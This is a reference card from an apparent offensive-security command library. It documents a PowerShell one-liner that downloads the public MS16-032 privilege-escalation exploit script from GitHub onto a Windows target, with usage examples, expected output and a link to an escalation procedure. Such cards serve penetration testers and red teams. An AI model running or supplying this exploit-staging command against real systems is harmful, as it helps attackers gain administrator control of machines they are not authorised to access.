---
type: command
executor: powershell
data: >-
  $url =
  "https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1";
  Invoke-WebRequest -Uri $url -OutFile "Invoke-MS16-032.ps1"
output: null
created_at: '2023-04-06T03:56:30Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Windows
tags:
  - download
  - exploit
verified: true
validated: true
---

# download-invoke-ms16-032-ps1

## Command

```powershell
$url = "https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1"; Invoke-WebRequest -Uri $url -OutFile "Invoke-MS16-032.ps1"
```

## Description

Downloads the PowerShell exploit script for MS16-032 from GitHub raw content directly to the current directory on a Windows target. This script implements the token inheritance race condition. Requires internet access and PowerShell v3+.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $url | GitHub raw URL for the script (fixed). | No |
| -OutFile | Local filename for the downloaded script. | Yes |
| -Uri | Download URL (set via $url). | Yes |

## Examples

### Basic Usage

```powershell
$url = "https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1"; Invoke-WebRequest -Uri $url -OutFile "Invoke-MS16-032.ps1"
```

### Download to Custom Path

```powershell
$url = "https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1"; Invoke-WebRequest -Uri $url -OutFile "C:\temp\exploit.ps1"
```

## Expected Output

```
StatusCode        : 200
StatusDescription : OK
...
Invoke-MS16-032.ps1
```

The file is saved; verify with Get-Item .

## Related

- [[procedures/MS16-032-Local-Privilege-Escalation]]
